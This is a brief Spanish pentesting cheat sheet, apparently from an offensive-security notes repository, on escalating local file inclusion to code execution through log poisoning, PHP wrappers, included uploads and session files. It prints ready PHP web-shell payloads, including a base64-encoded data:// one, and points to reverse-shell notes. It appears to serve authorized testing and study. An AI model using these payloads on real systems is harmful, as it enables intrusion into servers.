# LFI → RCE

Ver índice: [lfi-rfi.md](lfi-rfi.md). **Solo sobre objetivos autorizados.** Convertir una lectura (LFI) en ejecución de código.

## Vías habituales

### 1. Log poisoning
Inyecta código en un log que luego incluyes:
```
# 1) envía una petición con PHP en el User-Agent
User-Agent: <?php system($_GET['c']); ?>
# 2) incluye el log
?page=/var/log/apache2/access.log&c=id
```
También sirven `auth.log` (vía usuario SSH), logs de mail, etc.

### 2. Wrappers PHP
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id                      # si la extensión expect está cargada
php://input   (+ payload PHP en el cuerpo POST)
```

### 3. Incluir un fichero subido
Si hay una subida (aunque valide extensión), sube contenido con PHP y luego **inclúyelo** por LFI (la inclusión ejecuta, la extensión da igual).

### 4. PHP session / phpinfo
- Envenenar `/tmp/sess_<id>` con datos de sesión controlados e incluirlo.
- Técnica LFI + phpinfo para localizar ficheros temporales subidos.

## Notas

- Elige la vía según lo que puedas leer/escribir y las extensiones activas.
- Confirma con `id`/`whoami` y salta a reverse shell (`../../04-cheatsheets/por-fase/03-explotacion.md`).
